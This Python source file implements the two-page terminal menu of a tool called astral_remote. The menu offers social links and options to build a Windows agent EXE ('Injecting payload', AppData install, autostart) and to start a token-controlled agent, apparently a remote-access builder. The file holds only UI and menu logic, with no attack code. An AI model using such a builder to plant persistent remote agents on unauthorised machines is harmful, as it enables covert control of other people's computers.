# Interactive two-page terminal menu for `python -m astral_remote`.
# Page 1 (HOME): social links. Page 2 (REMOTE): Generate EXE, Start Agent.
# Parsing, aliases, and empty-input semantics match src/cli/menu.js.
# Quitting is confirmed by repeating the gesture (q + Enter, or Ctrl+C
# again) so an accidental one does not close the menu. Rendering uses
# Rich views.
# Ported from src/cli/menu.js.

from __future__ import annotations

import sys
import time
import webbrowser

from rich.console import Console
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn

from astral_remote.agent.secure_input import INTERRUPTED, InterruptedError
from astral_remote.cli.links import SOCIAL_LINKS
from astral_remote.cli.theme import style_text, supports_color
from astral_remote.cli.views import (
    home_block,
    kali_prompt_text,
    load_banner_text,
    print_block,
    remote_block,
    render_banner_text,
    status_panel,
)

# Blank-screen hold before the first interactive paint. Non-interactive
# streams (pipes, logs) skip it entirely so captured output stays plain.
STARTUP_BLANK_SECONDS = 0.7

# Quitting must be confirmed by repeating the gesture: q + Enter for a typed
# quit, a second Ctrl+C for an interrupt.
QUIT_HINT_TYPE = "Type Q again to quit: "
QUIT_HINT_INTERRUPT = "Press Ctrl + C again to quit. "


def parse_home_choice(raw) -> str | None:
    """Parse HOME-page input. Returns an action string or None for invalid."""
    c = str(raw if raw is not None else "").strip().lower()
    if c in ("1", "01"):
        return "github"
    if c in ("2", "02"):
        return "telegram"
    if c in ("3", "03"):
        return "discord"
    if c in ("n", "next"):
        return "next"
    if c in ("q", "quit", "exit", ""):
        return "exit"
    return None


def parse_remote_choice(raw) -> str | None:
    """Parse REMOTE-page input. Returns an action string or None for invalid."""
    c = str(raw if raw is not None else "").strip().lower()
    if c in ("1", "01"):
        return "generate"
    if c in ("2", "02"):
        return "start"
    if c in ("b", "back"):
        return "back"
    if c in ("q", "quit", "exit"):
        return "exit"
    return None


def parse_dev_choice(raw) -> str | None:
    """Legacy alias mapping remote-page choices. Kept for compatibility."""
    return parse_remote_choice(raw)


def open_url(url: str, console: Console, enabled: bool) -> bool:
    """Open a validated URL in the system browser. Allowlist only."""
    allowed = set(SOCIAL_LINKS.values())
    if url not in allowed:
        console.print(status_panel("error", f'Blocked: "{url}" is not an allowed URL.', enabled))
        return False
    try:
        webbrowser.open(url)
        return True
    except Exception as err:  # noqa: BLE001 - message shown to the user
        console.print(status_panel("warn", f"Could not open browser: {err}", enabled))
        return False


def read_choice(console: Console, enabled: bool):
    """Print the Kali two-liner and read one menu line. Ctrl+C raises InterruptedError."""
    line1, line2 = kali_prompt_text(enabled)
    console.print(line1)
    try:
        return console.input(line2)
    except KeyboardInterrupt as exc:
        raise InterruptedError(INTERRUPTED) from exc
    except EOFError:
        return ""


def confirm_exit(console: Console, enabled: bool, interrupted: bool = False) -> bool:
    """Ask for the quit gesture again. True means the quit may proceed.

    A typed `q` in response to a typed quit, or a second Ctrl+C in response
    to an interrupt, confirms the exit. Typing anything at the interrupt hint
    (including `q`) does not confirm. Ctrl+C always confirms, and EOF accepts
    so a closed stream can never trap the process in the menu.
    """
    hint = QUIT_HINT_INTERRUPT if interrupted else QUIT_HINT_TYPE
    try:
        answer = console.input(style_text(hint, enabled))
    except (KeyboardInterrupt, EOFError):
        return True
    if interrupted:
        return False
    return str(answer).strip().lower() == "q"


def physical_line_count(plain_text: str, width=None) -> int:
    """Count physical terminal rows for plain text at the given width.

    Used to erase exactly the previously drawn menu block. Falls back to
    logical lines when width is unknown. Never returns less than 1 per line.
    """
    lines = str(plain_text).split("\n")
    if not isinstance(width, int) or width <= 0:
        return len(lines)
    total = 0
    for line in lines:
        total += max(1, -(-len(line) // width))
    return total


def prompt_rows(raw, enabled: bool, width=None) -> int:
    """Count physical rows occupied by the prompt plus echoed input."""
    line1, line2 = kali_prompt_text(enabled)
    rows = physical_line_count(line1.plain, width)
    rows += physical_line_count(line2.plain + str(raw if raw is not None else ""), width)
    return rows


def _write_raw(console: Console, text: str) -> bool:
    """Write raw control text to the console stream. False when unwritable.

    Centralizes the best-effort write-and-flush with the exception guard
    shared by every cursor-control and alt-screen sequence, so pipes and
    closed streams never raise.
    """
    try:
        stream = console.file
        if stream is None:
            return False
        stream.write(text)
        stream.flush()
        return True
    except (OSError, ValueError, AttributeError):
        return False


def erase_lines(console: Console, count: int) -> None:
    """Erase the last `count` physical lines in place (cursor up + clear).

    Positions the cursor where the erased region started so the next draw
    replaces it. No-op for non-positive counts or unwritable streams.
    """
    if not isinstance(count, int) or count <= 0:
        return
    sequence = f"\x1b[{count}A" + "\x1b[2K\x1b[1B" * count + f"\x1b[{count}A"
    _write_raw(console, sequence)


def is_interactive(console: Console) -> bool:
    """Return True only when both output and input are real TTYs.

    Cursor-control redraws run exclusively in this mode; pipes and logs
    keep plain appended output with no escape sequences.
    """
    try:
        return bool(console.is_terminal) and bool(sys.stdin.isatty())
    except (OSError, ValueError, AttributeError):
        return False


def refresh_screen(console: Console, art: str, enabled: bool, width=None) -> None:
    """Clear the action region and redraw a fresh banner for the next menu.

    Called after build/start actions return so stale token prompts, build
    logs, and result output never pile up above the menu. Banner content
    itself is never modified. Pipes and logs are untouched.
    """
    if not _write_raw(console, "\x1b[H\x1b[2J"):
        return
    if art != "":
        print_block(console, render_banner_text(art, enabled, width))


class _AlternateScreen:
    """Alternate-screen buffer switch for full-screen interactive sessions.

    Writes the enter/exit sequences explicitly so the switch does not
    depend on Rich renderable machinery. Restores the main buffer even
    when the menu loop raises or the process is interrupted.
    """

    def __init__(self, console: Console) -> None:
        self._console = console

    def __enter__(self) -> "_AlternateScreen":
        _write_raw(self._console, "\x1b[?1049h\x1b[H\x1b[2J")
        return self

    def __exit__(self, *exc_info) -> bool:
        _write_raw(self._console, "\x1b[?1049l")
        return False


def run_menu() -> int:
    """Run the two-page menu loop until the user confirms quit or cancels."""
    enabled = supports_color()
    no_color = not enabled
    console = Console(no_color=no_color, highlight=False)
    width = console.width if console.is_terminal else None

    art = load_banner_text()

    interactive = is_interactive(console)

    # Full-screen like OpenCode: interactive sessions run inside the
    # alternate screen buffer, restored automatically on exit. Pipes and
    # logs keep plain output with no screen sequences.
    from contextlib import nullcontext

    screen = _AlternateScreen(console) if interactive else nullcontext()
    with screen:
        # Interactive sessions open on a cleared alternate screen; hold it
        # blank briefly so the banner appears a beat after launch instead
        # of snapping in on the same frame as the buffer switch.
        if interactive:
            time.sleep(STARTUP_BLANK_SECONDS)
        if art != "":
            print_block(console, render_banner_text(art, enabled, width))
        page = "home"
        while True:
            block = home_block(enabled, width) if page == "home" else remote_block(enabled)
            menu_rows = physical_line_count(block.plain, console.width if interactive else width)
            print_block(console, block)
            try:
                raw = read_choice(console, enabled)
            except InterruptedError:
                # Ctrl+C: the menu stays visible and a second Ctrl+C quits.
                if not interactive:
                    return 0
                _write_raw(console, "\n")
                if confirm_exit(console, enabled, interrupted=True):
                    return 0
                refresh_screen(console, art, enabled, width)
                continue
            if raw is None:
                return 0
            choice = parse_home_choice(raw) if page == "home" else parse_remote_choice(raw)
            # Option 01 (Generate EXE) keeps the REMOTE menu and the echoed
            # choice on screen, so its token and output-name prompts appear
            # directly below the menu. A quit request also keeps the menu on
            # screen while its confirmation hint is shown. Every other choice
            # erases the menu first so the next draw replaces this region
            # instead of stacking another menu underneath it.
            keep_menu = page == "remote" and choice == "generate"
            if interactive and not keep_menu and choice != "exit":
                # Terminate the input row explicitly: real terminals already
                # moved to a fresh row on Enter while non-echoing streams did
                # not, so one forced newline makes the cursor position (and
                # therefore the erase count) deterministic in both cases.
                _write_raw(console, "\n")
                # Erase the menu block plus prompt/echoed input before running
                # the action, so the next draw replaces this region instead of
                # appending another menu below it. Action output (results,
                # warnings) stays in scrollback; menus never accumulate.
                erase_lines(console, menu_rows + prompt_rows(raw, enabled, console.width) + 1)

            if choice == "exit":
                if not interactive or confirm_exit(console, enabled):
                    return 0
                # Declined: clear the menu, the prompt rows, and the hint that
                # was printed below them before the loop redraws the menu.
                _write_raw(console, "\n")
                erase_lines(console, menu_rows + prompt_rows(raw, enabled, console.width) + 2)
                continue

            if page == "home":
                if choice == "github":
                    open_url(SOCIAL_LINKS["github"], console, enabled)
                elif choice == "telegram":
                    open_url(SOCIAL_LINKS["telegram"], console, enabled)
                elif choice == "discord":
                    open_url(SOCIAL_LINKS["discord"], console, enabled)
                elif choice == "next":
                    page = "remote"
                else:
                    pass
            else:
                if choice == "generate":
                    run_generate(console, enabled, show_token_header=False)
                    if interactive:
                        refresh_screen(console, art, enabled, width)
                elif choice == "start":
                    result = run_start(console, enabled)
                    if result == "exit":
                        return 0
                    if interactive:
                        refresh_screen(console, art, enabled, width)
                elif choice == "back":
                    page = "home"
                else:
                    pass


def wait_to_continue(console: Console, enabled: bool) -> None:
    """Pause with an enter-to-continue prompt so results stay readable.

    Themed like the rest of the CLI. Erases its own prompt row on
    continue so the redrawn menu follows immediately. Returns at once
    on Ctrl+C or EOF (pipes never hang).
    """
    try:
        console.input(style_text("press enter to continue...", enabled))
    except (KeyboardInterrupt, EOFError):
        return
    if is_interactive(console):
        _write_raw(console, "\n")
        erase_lines(console, 2)


def run_generate(console: Console, enabled: bool, show_token_header: bool = True) -> bool:
    """Run the EXE build with staged progress reporting. Returns True on success.

    `show_token_header` keeps the void-style token header for standalone
    builds (the `build` subcommand). The interactive menu passes False
    because it keeps its own prompt block on screen.
    """
    from rich.text import Text as RichText

    from astral_remote.builder.build import (
        build_agent,
        prompt_autostart,
        prompt_build_token,
        prompt_exe_name,
        prompt_install_appdata,
        prompt_prefix,
    )

    stages = ["Validating token", "Preparing template", "Injecting payload", "Verifying output"]
    try:
        token = prompt_build_token(show_header=show_token_header)
    except InterruptedError:
        return False
    except (OSError, ValueError) as err:
        console.print(status_panel("warn", str(err), enabled))
        wait_to_continue(console, enabled)
        return False
    try:
        output_name = prompt_exe_name()
        prefix = prompt_prefix()
        install_appdata = prompt_install_appdata()
        autostart = prompt_autostart()
    except InterruptedError:
        return False
    progress = Progress(
        SpinnerColumn(), TextColumn("{task.description}"), BarColumn(),
        console=console, disable=not console.is_terminal,
    )
    try:
        with progress:
            task = progress.add_task("Building", total=len(stages))
            def on_stage(name: str) -> None:
                progress.update(task, description=name, advance=1)
            result = build_agent(token=token, on_stage=on_stage, output_name=output_name,
                                 install_to_appdata=install_appdata, enable_autostart=autostart,
                                 prefix=prefix)
    except (InterruptedError, KeyboardInterrupt):
        # Build cancelled: stop only the build, back to menu.
        return False
    except Exception as err:  # noqa: BLE001 - build errors are user-safe by construction
        console.print(RichText(f"Build failed: {err}", style="red" if enabled else "none"))
        wait_to_continue(console, enabled)
        return False
    console.print(RichText(f"Build passed: {result['exe_path']}", style="green" if enabled else "none"))
    console.print(RichText(f"Command prefix: {result['prefix']}", style="green" if enabled else "none"))
    console.print(RichText(f"Smoke test: {result['version_line']}", style="green" if enabled else "none"))
    wait_to_continue(console, enabled)
    return True


def run_start(console: Console, enabled: bool) -> str | None:
    """Start the agent with a freshly entered token. Returns 'exit' when the user quits."""
    import asyncio

    from astral_remote.agent.secure_input import prompt_for_token
    from astral_remote.shared.config import default_runtime_config

    try:
        token = prompt_for_token()
    except InterruptedError:
        # Token entry cancelled with q or Ctrl+C: back to menu, not exit.
        return None
    except (OSError, ValueError) as err:
        console.print(status_panel("warn", str(err), enabled))
        return None
    try:
        from astral_remote.agent.app import run_agent

        async def _run() -> None:
            await run_agent(token, default_runtime_config())
            await asyncio.Event().wait()

        asyncio.run(_run())
    except KeyboardInterrupt:
        # Agent stopped: stop only the agent, back to menu.
        return None
    except Exception as err:  # noqa: BLE001 - sanitized, token-free
        console.print(status_panel("error", f"Agent failed to start: {err}", enabled))
    return None


__all__ = ["confirm_exit", "erase_lines", "is_interactive", "open_url", "parse_dev_choice", "parse_home_choice",
           "parse_remote_choice", "physical_line_count", "prompt_rows", "read_choice", "refresh_screen",
           "run_generate", "run_menu", "run_start", "wait_to_continue"]
